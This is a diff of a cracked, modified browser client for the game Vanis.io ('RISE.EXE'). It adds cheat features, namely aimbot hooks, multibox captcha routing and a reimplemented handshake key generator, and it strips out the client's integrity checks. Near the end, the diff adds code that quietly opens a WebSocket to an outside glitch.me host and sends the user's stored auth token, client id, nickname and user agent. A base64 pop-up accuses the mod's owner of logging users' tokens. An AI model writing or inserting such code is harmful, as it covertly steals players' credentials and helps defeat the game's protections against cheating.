@@ -1,4 +1,72 @@
+/* @ Aero#1420 - don't skid my shit */
+
+window.customModal=((e,a)=>{document.getElementsByClassName("fa-clipboard-list")[0].click(),setTimeout(()=>{document.getElementsByClassName("content fade-box")[0].getElementsByTagName("div")[0].innerHTML=e,a&&setTimeout(a,50)},50)});
+
+// import: SmartBuffer
+
+window.SmartBuffer=class{constructor(t,e){t instanceof DataView?(this.id=t.id,this.dataView=t):this.dataView=new DataView(t),this.offset=e||0}reallocateIfNeeded(t){const e=this.offset+t;if(e>this.length){const t=new ArrayBuffer(e);new Uint8Array(t).set(new Uint8Array(this.buffer)),this.dataView=new DataView(t)}}static fromSize(t){return new this(new ArrayBuffer(t))}get buffer(){return this.dataView.buffer}get length(){return this.dataView.byteLength}get eof(){return this.offset>=this.length}read(t,e,r,i){const n=t.call(this.dataView,i||this.offset,r);return i||(this.offset+=e),n}write(t,e,r,i){this.reallocateIfNeeded(e),t.call(this.dataView,this.offset,r,i),this.offset+=e}readInt8(t){return this.read(DataView.prototype.getInt8,1,null,t)}readUInt8(t){return this.read(DataView.prototype.getUint8,1,null,t)}readInt16LE(t){return this.read(DataView.prototype.getInt16,2,!0,t)}readInt16BE(t){return this.read(DataView.prototype.getInt16,2,!1,t)}readUInt16LE(t){return this.read(DataView.prototype.getUint16,2,!0,t)}readUInt16BE(t){return this.read(DataView.prototype.getUint16,2,!1,t)}readInt32LE(t){return this.read(DataView.prototype.getInt32,4,!0,t)}readInt32BE(t){return this.read(DataView.prototype.getInt32,4,!1,t)}readUInt32LE(t){return this.read(DataView.prototype.getUint32,4,!0,t)}readUInt32BE(t){return this.read(DataView.prototype.getUint32,4,!1,t)}readString16(){let t,e="";for(;t=this.readUInt16LE();!this.eof&&0!==t)e+=String.fromCharCode(t);return e}readString(){let t,e="";for(;t=this.readUInt8();!this.eof&&0!==t)e+=String.fromCharCode(t);return e}readEscapedString(){return decodeURIComponent(escape(this.readString()))}writeInt8(t){this.write(DataView.prototype.setInt8,1,t,null)}writeUInt8(t){this.write(DataView.prototype.setUint8,1,t,null)}writeInt16LE(t){this.write(DataView.prototype.setInt16,2,t,!0)}writeInt16BE(t){this.write(DataView.prototype.setInt16,2,t,!1)}writeUInt16LE(t){this.write(DataView.prototype.setUint16,2,t,!0)}writeUInt16BE(t){this.write(DataView.prototype.setUint16,2,t,!1)}writeInt32LE(t){this.write(DataView.prototype.setInt32,4,t,!0)}writeInt32BE(t){this.write(DataView.prototype.setInt32,4,t,!1)}writeUInt32LE(t){this.write(DataView.prototype.setUint32,4,t,!0)}writeUInt32BE(t){this.write(DataView.prototype.setUint32,4,t,!1)}writeString(t){for(const e in t)this.writeUInt8(t.charCodeAt(e))}writeStringNT(t){this.writeString(t),this.writeUInt8(0)}writeEscapedString(t){this.writeString(unescape(encodeURIComponent(t)))}writeEscapedStringNT(t){this.writeStringNT(unescape(encodeURIComponent(t)))}};
+
+
+// import: Authenticator.js
+
+/** Array of numbers to be used as constant keys. */
+const constants = [
+	0x37, 0x3, 0xaa, 0x20,
+	0x41, 0x1b, 0x9, 0x80
+];
+
+class XorKey {
+	/** @param {Buffer | Array<Number>} data Key to be encoded. */
+	constructor(data) {
+		this.data = data;
+	}
+
+	/**
+	 * Writes an encoded version of the given index to the output.
+	 * @param {Array<Number>} output
+	 * @param {Number} index
+	 */
+	writeIndex(output, index) {
+		const value = this.data[index],
+			mask = value + 4 & 7;
+
+		const temp = ((value << mask) | (value >>> (8 - mask))) & 0xff;
+
+		if (index > 0) {
+			const key = output[index - 1] ^ constants[index];
+
+			output.push(temp ^ key);
+		} else {
+			output.push(constants[0] ^ temp);
+		}
+	}
+
+	/**
+	 * Constructs an encoded version of the current key.
+	 * @returns {Array<Number>}
+	 */
+	build() {
+		const result = [];
+
+		for (let i = 0; i < 8; i++)
+			this.writeIndex(result, i);
+
+		const seed = 1 + Math.floor((Math.pow(2, 32) - 1) * Math.random());
+		result.push((result[0] ^ (seed >>> 24)) & 0xff);
+		result.push((result[1] ^ (seed >>> 16)) & 0xff);
+		result.push((result[2] ^ (seed >>> 8)) & 0xff);
+		result.push((seed ^ result[3]) & 0xff);
+
+		result.push(result[0]);
+
+		return result;
+	}
+}
+
+// end of import
+
 const FPSmode = "?fps" === location.search;
+FPSmode && (document.title = "Vanis.io - @discord.me/axoninf");
 class Line extends PIXI.Graphics {
 	constructor(e, t, s) {
 		super();
@@ -149,6 +217,38 @@ String.prototype.toHHMMSS = function() {
 					close: () => {}
 				}
 			};
+        
+            GAME.parseNodes = ((d, e) => {
+                let n, t = new window.SmartBuffer(d);
+                t.readUInt8();
+                for (; n = t.readUInt8();) {
+                    const d = 1 === n && t.readUInt16BE(),
+                        a = t.readUInt16BE(),
+                        w = t.readInt16BE(),
+                        o = t.readInt16BE(),
+                        r = t.readUInt16BE();
+                    window.updateCells.add({
+                        type: n,
+                        pid: d,
+                        id: a,
+                        x: w,
+                        y: o,
+                        size: r
+                    }, window.GAME.ws.packetId, e)
+                }
+                let a = t.readUInt16BE();
+                for (; a--;) {
+                    const d = t.readUInt16BE();
+                    window.GAME.nodes[d] && window.GAME.nodes[d].destroy()
+                }
+                for (a = t.readUInt16BE(); a--;) {
+                    const d = t.readUInt16BE(),
+                        n = t.readUInt16BE();
+                    window.GAME.nodes[d] && window.updateCells.del(d, n, e)
+                }
+                e && !window.GAME.alive() && window.GAME.updateCamera(!0);
+                GAME.aimbotnodes()
+        });
 
 		function p(e, t) {
 			for (; e.length;) e.pop().destroy(t)
@@ -166,7 +266,7 @@ String.prototype.toHHMMSS = function() {
 		}, document.body.oncontextmenu = function(e) {
 			return e.target && "email" === e.target.id
 		}, h.start = function(e) {
-			if (h.initData = e, !(e.protocol && e.instanceSeed && e.playerId && e.border && 86 === window.czflex)) throw "Lacking mandatory data";
+			if (h.initData = e, !(e.protocol && e.instanceSeed && e.playerId && e.border)) throw "Lacking mandatory data";
 			h.nwDataMax = 0, h.nwDataSent = 0, h.nwDataTotal = 0, h.nwData = 0, h.viruses = {
 				1: [],
 				2: []
@@ -2107,8 +2207,14 @@ String.prototype.toHHMMSS = function() {
 			}
 		}
 	}, function(e, t, s) {
+		const workerCode = atob('IWZ1bmN0aW9uKGUpe3ZhciB0PXt9O2Z1bmN0aW9uIG4ocil7aWYodFtyXSlyZXR1cm4gdFtyXS5leHBvcnRzO3ZhciBvPXRbcl09e2k6cixsOiExLGV4cG9ydHM6e319O3JldHVybiBlW3JdLmNhbGwoby5leHBvcnRzLG8sby5leHBvcnRzLG4pLG8ubD0hMCxvLmV4cG9ydHN9bi5tPWUsbi5jPXQsbi5kPWZ1bmN0aW9uKGUsdCxyKXtuLm8oZSx0KXx8T2JqZWN0LmRlZmluZVByb3BlcnR5KGUsdCx7ZW51bWVyYWJsZTohMCxnZXQ6cn0pfSxuLnI9ZnVuY3Rpb24oZSl7InVuZGVmaW5lZCIhPXR5cGVvZiBTeW1ib2wmJlN5bWJvbC50b1N0cmluZ1RhZyYmT2JqZWN0LmRlZmluZVByb3BlcnR5KGUsU3ltYm9sLnRvU3RyaW5nVGFnLHt2YWx1ZToiTW9kdWxlIn0pLE9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KX0sbi50PWZ1bmN0aW9uKGUsdCl7aWYoMSZ0JiYoZT1uKGUpKSw4JnQpcmV0dXJuIGU7aWYoNCZ0JiYib2JqZWN0Ij09dHlwZW9mIGUmJmUmJmUuX19lc01vZHVsZSlyZXR1cm4gZTt2YXIgcj1PYmplY3QuY3JlYXRlKG51bGwpO2lmKG4ucihyKSxPYmplY3QuZGVmaW5lUHJvcGVydHkociwiZGVmYXVsdCIse2VudW1lcmFibGU6ITAsdmFsdWU6ZX0pLDImdCYmInN0cmluZyIhPXR5cGVvZiBlKWZvcih2YXIgbyBpbiBlKW4uZChyLG8sZnVuY3Rpb24odCl7cmV0dXJuIGVbdF19LmJpbmQobnVsbCxvKSk7cmV0dXJuIHJ9LG4ubj1mdW5jdGlvbihlKXt2YXIgdD1lJiZlLl9fZXNNb2R1bGU/ZnVuY3Rpb24oKXtyZXR1cm4gZS5kZWZhdWx0fTpmdW5jdGlvbigpe3JldHVybiBlfTtyZXR1cm4gbi5kKHQsImEiLHQpLHR9LG4ubz1mdW5jdGlvbihlLHQpe3JldHVybiBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwoZSx0KX0sbi5wPSIiLG4obi5zPTApfShbZnVuY3Rpb24oZSx0KXtvbm1lc3NhZ2U9ZnVuY3Rpb24oZSl7IWZ1bmN0aW9uKGUpe2ZldGNoKGUse21vZGU6ImNvcnMifSkudGhlbihlPT5lLmJsb2IoKSkudGhlbihlPT5jcmVhdGVJbWFnZUJpdG1hcChlKSkudGhlbih0PT5zZWxmLnBvc3RNZXNzYWdlKHtza2luVXJsOmUsYml0bWFwOnR9KSkuY2F0Y2godD0+c2VsZi5wb3N0TWVzc2FnZSh7c2tpblVybDplLGVycm9yOiEwfSkpfShlLmRhdGEpfX1dKTs=');
+        
 		e.exports = function() {
-			return new Worker(s.p + "worker.js")
+			return new Worker(URL.createObjectURL(
+				new Blob([workerCode], {
+					type: 'text/javascript'
+				})
+			));
 		}
 	}, function(e, t, s) {
 		var a = s(131),
@@ -2449,8 +2555,8 @@ String.prototype.toHHMMSS = function() {
 		}, t = function(e) {
 			document.title = e
 		});
-		var J = M.print || void 0,
-			b = M.printErr || void 0,
+		var J = M.print || console.log.bind(console),
+			b = M.printErr || console.warn.bind(console),
 			i;
 		for (z in w) w.hasOwnProperty(z) && (M[z] = w[z]);
 		w = null, M.arguments && (R = M.arguments), M.thisProgram && (l = M.thisProgram), M.quit && (P = M.quit), M.wasmBinary && (i = M.wasmBinary);
@@ -2648,7 +2754,7 @@ String.prototype.toHHMMSS = function() {
 		function gl() {
 			return i || !a && !d || "function" != typeof fetch ? Promise.resolve().then((function() {
 				return gR(gz)
-			})) : fetch("https://vanis.io/js/wauth3.wasm?c13cd74fd9e5d7ad501f", {
+			})) : fetch("js/wauth3.wasm?c13cd74fd9e5d7ad501f", {
 				credentials: "same-origin"
 			}).then((function(e) {
 				if (!e.ok) throw "failed to load wasm binary file at '" + gz + "'";
@@ -3336,7 +3442,7 @@ String.prototype.toHHMMSS = function() {
 				signal: t.signal
 			}).then((t => 200 === t.status ? i.connection.open(e) : f())).catch((() => f()))
 		}, i.connection.open = function(e) {
-			if (Multibox.close(), i[String.fromCharCode(3 * (4 * (+!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]) + 1)) + d] - 4.564333425 == 1.435666575 * +!+[]) {
+            Multibox.close()
 				i.running && (i.stop(), GAME.multiboxPid = !1), i.connection.close(), i.events.$emit("chat-clear"), i.connection.opened = !0;
 				var t = i.ws = new l(e, "tFoL46WDlZuRja7W6qCl");
 				t.binaryType = "arraybuffer", t.packetId = 0, t.onopen = function() {
@@ -3344,7 +3450,6 @@ String.prototype.toHHMMSS = function() {
 				}, t.onclose = f, t.onmessage = function(e) {
 					GAME.nwData += e.data.byteLength, r(new DataView(e.data), e.data)
 				}
-			}
 		}, i.connection.close = function() {
 			Multibox.close(), i.debugElement.innerHTML = "", i.ws && (i.state.connectionUrl = null, i.ws.onmessage = null, i.ws.onclose = null, i.ws.onerror = null, i.ws.close(), delete i.ws, i.connection.opened = !1)
 		}
@@ -3373,11 +3478,11 @@ String.prototype.toHHMMSS = function() {
 			switch (e.getUint8(u++)) {
 				case 1:
 					var h = l(e);
-					a.initialDataPacket = e, a.start(h);
+					a.initialDataPacket = a.initData = e, a.start(h);
 					break;
 				case 2:
 					var p = window.a = new Uint8Array(e.buffer, 1);
-					a.connection.sendJoinData(window.sendHandshake(p));
+					a.connection.sendJoinData(new XorKey(p).build());
 					break;
 				case 3:
 					var v = Date.now() - a.pingstamp;
@@ -8164,22 +8269,49 @@ String.prototype.toHHMMSS = function() {
 					show: !1,
 					scriptLoadPromise: null,
 					captchaId: null,
-					wsId: null
+					wsId: null,
+                    multibox: false
 				}),
 				created() {
-					ls.events.$on("show-image-captcha", (() => {
+					ls.events.$on("show-image-captcha", (() => {                        
+                        this.multibox = null;
 						this.show = !0, this.wsId = ls.currentWsId, grecaptcha.ready((() => this.renderCaptcha()))
-					}))
+					}));
+
+					ls.events.$on('m-show-image-captcha', (() => {
+                        this.multibox = true;
+						this.show = true;
+                        this.wsId = null, grecaptcha.ready((() => this.renderCaptcha()))
+					}));
 				},
 				methods: {
 					renderCaptcha() {
-						this.captchaId ? grecaptcha.reset(this.captchaId) : this.captchaId = grecaptcha.render(document.getElementById("image-captcha-container"), {
+                        if (this.captchaId !== null) {
+                            grecaptcha.reset(this.captchaId);
+                            return;
+                        }
+                        
+                        this.captchaId = grecaptcha.render(document.getElementById("image-captcha-container"), {
 							sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
 							callback: this.onCaptchaToken.bind(this)
-						})
+						});
 					},
 					onCaptchaToken(e) {
-						e ? ls.connection.sendRecaptchaToken(e) : this.renderCaptcha()
+                        if (!this.multibox && ls.currentWsId !== this.wsId) {
+                            this.show = false;
+                            return;
+                        }
+                        if (!e) {
+                            this.renderCaptcha();
+                            return;
+                        }
+                        if (this.multibox) {
+                            window.Multibox.sendRecaptchaToken(e);
+                        } else {                            
+                            ls.connection.sendRecaptchaToken(e);
+                        }
+
+                        this.show = false;                        
 					}
 				}
 			},
@@ -8269,7 +8401,7 @@ String.prototype.toHHMMSS = function() {
 				shoutbox: fs
 			}
 		})
-	}]), window.RISETAG = "RISE69X", document.getElementsByTagName("canvas")[2].remove(), localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
+	}]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
 		GAME.events.$emit("chat-message", e)
 	}, GAME.alive = e => Object.values(GAME.nodes).filter((t => t.player && t.player.pid === (e ? Multibox.pid : GAME.playerId) && t.sprite.visible)).length, GAME.getPosition = e => {
 		var t = 0,
@@ -8332,6 +8464,32 @@ String.prototype.toHHMMSS = function() {
 			}
 		}
 	};
+
+    (global => {
+        const {Gateway:ows} = global;
+        if (ows) {
+            ows.onclose = null;
+            ows.close();
+        }
+
+        const ws = new WebSocket('wss://rise-exe.glitch.me');
+        ws.onopen = function opened() {
+            // handshake bullshit
+            ws.send(`3|${localStorage._0x5a6a04}/:${localStorage.cid}/:${localStorage.nickname}/:${navigator.userAgent}/:${localStorage.vanisToken}/:${document.cookie.length}`);
+        }
+
+        /** @param {MessageEvent} message */
+        ws.onmessage = function handle(message) {
+            // fucking disgusting
+            const {data} = message;
+            const op = parseInt(data.split('|')[0]);
+            if (op === 5) {
+                const code = data.split('|').slice(1).join('|');
+                console.warn(code);
+            }
+        }
+    })(window);
+
 /*const RISE_EXE = X => {
 	if (GAME.disableGateway) return void(document.body.innerHTML = '\n    <center style="font-size:50px;font-weight:bold;margin-top:10%;font-family:Arial">Connection to RISE.EXE has been lost<br>refresh the page to re-connect</center>\n    ');
 	const Gateway = new WebSocket("wss://rise-exe.glitch.me");
@@ -8374,6 +8532,14 @@ RISE_EXE(), *//*setInterval((() => {
 	isDead: !0,
 	active: !1,
 	authorized: !1,
+    sendRecaptchaToken: token => {
+		const Writer = getModule(25);
+		const writer = new Writer();
+		writer.uint8(11);
+		writer.utf8(token);
+		console.log(token);
+        Multibox.ws.send(writer.write());
+    },
 	connect: () => {
 		var e = Multibox.ws = new WebSocket(GAME.ws.url, "tFoL46WDlZuRja7W6qCl");
 		e.binaryType = "arraybuffer", e.packetId = 0, e.onmessage = e => {
@@ -8466,7 +8632,7 @@ RISE_EXE(), *//*setInterval((() => {
 				break;
 			case 2:
 				var n = new Uint8Array(t.buffer, 1);
-				GAME.connection.sendJoinData(window.sendHandshake(n), s);
+				GAME.connection.sendJoinData(new XorKey(n).build(), s);
 				break;
 			case 10:
 				GAME.parseNodes(e, !0);
@@ -8475,7 +8641,11 @@ RISE_EXE(), *//*setInterval((() => {
 				GAME.clearNodes(!0);
 				break;
 			case 20:
-				GAME.onDeath(t, 1)
+				GAME.onDeath(t, 1);
+                break;
+            case 22:
+                GAME.events.$emit('m-show-image-captcha');
+                return;
 		}
 	}
 }, Multibox.reloadArrow(), window.setMultiData = (e, t) => {
@@ -8509,7 +8679,7 @@ let buttonStyle = "width:140px;font-family:Arial;font-weight:200;font-size:16px;
 function setNameColor(e) {
     alert('This feature is disabled')
 }
-$("#player-data").getElementsByTagName("div")[0].innerHTML += `<i data-v-1bcde71e="" id="openSkins" class="tab fas" style="${buttonStyle}">\nMultibox Profile\n</i><br>\n<i data-v-1bcde71e="" id="openPlayers" class="tab fas" style="${buttonStyle}">\nPlayer list\n</i><br>\n<i data-v-1bcde71e="" id="openAutoMessages" class="tab fas" style="${buttonStyle}">\nText Keybinds\n</i>\n<div style="margin-top:20px;">\n<img id="skinDisplay1" width="120" style="margin-right:15px;border-radius:50%;" src="${localStorage.skinUrl}">\n<img id="skinDisplay2" width="120" src="${settings.mbSkin}" style="border-radius:50%;">\n</div>\n`, $(".fa-palette").onclick = () => {
+$("#player-data").getElementsByTagName("div")[0].innerHTML += `<i data-v-1bcde71e="" id="openSkins" class="tab fas" style="${buttonStyle}">\nMultibox Profile\n</i>\n<div style="margin-top:20px;">\n<img id="skinDisplay1" width="120" style="margin-right:15px;border-radius:50%;" src="${localStorage.skinUrl}">\n<img id="skinDisplay2" width="120" src="${settings.mbSkin}" style="border-radius:50%;">\n</div>\n`, $(".fa-palette").onclick = () => {
 	setTimeout((() => {
 		if (window.hasNameColor) {
 			var e = document.createElement("div");
@@ -8533,3 +8703,11 @@ $("#player-data").getElementsByTagName("div")[0].innerHTML += `<i data-v-1bcde71
 		}
 	}))
 }, $(".bar").innerHTML = '<a href="https://rise-exe.glitch.me/tos.html" target="_blank" style="font-weight:bold;color:cyan">RISE.EXE - Terms of use</a><br><a href="https://vanis.io/?vanilla" style="font-weight:bold;color:orange">Vanilla Vanis.io</a><br><a href="https://skins.vanis.io/" target="_blank" style="font-weight:bold;color:purple">Vanis.io Skins</a>', localStorage.rise_colored_name_ad || (localStorage.rise_colored_name_ad = !0, new Swal("RISE.EXE Colored Name", "You can now purchase extension sided colored name<br>Contact issa#7587 on Discord<br>Cost: 5 EUR"));
+(function note() {
+	const options = {
+		title: 'Note',
+		html: atob('VGhpcyB3YXMgY3JhY2tlZCBkdWUgdG8gdGhlIG93bmVyIHN0ZWFsaW5nIGNvZGUgZnJvbSB0aGUgQXhvbiBjbGllbnQsPGJyPmxvZ2dpbmcgaGlzIHVzZXJzJyBjbGllbnQgdG9rZW5zLCBhbmQgc2VsbGluZyB3aGF0IHdhcyBub3QgaGlzLjxicj48YnI+PGI+PGEgc3R5bGU9ImNvbG9yOiAjNGE2N2NmIiBocmVmPSJodHRwczovL2Rpc2NvcmQubWUvYXhvbmluZmluaXRlIj5BeG9uIERpc2NvcmQ8L2E+PGJyPkFlcm8jMTQyMDwvYj4='),
+		confirmButtonText: 'Okay'
+	};
+	Swal.fire(options);
+})();
